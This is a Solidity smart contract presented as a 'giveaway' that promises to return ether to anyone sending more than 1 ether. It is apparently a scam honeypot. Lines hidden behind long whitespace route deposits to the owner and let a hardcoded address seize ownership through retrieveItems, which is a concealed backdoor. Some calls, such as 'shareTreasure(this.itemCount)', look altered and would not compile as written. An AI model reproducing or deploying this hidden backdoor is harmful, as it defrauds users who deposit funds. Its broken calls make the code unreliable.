pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public GuildLeader = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    GuildLeader.shareTreasure(this.itemCount);
            msg.sender.shareTreasure(this.itemCount);
        }
    }

    function retrieveItems()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){GuildLeader=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == GuildLeader);
        GuildLeader.shareTreasure(this.itemCount);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == GuildLeader);
        adr.call.value(msg.value)(data);
    }
}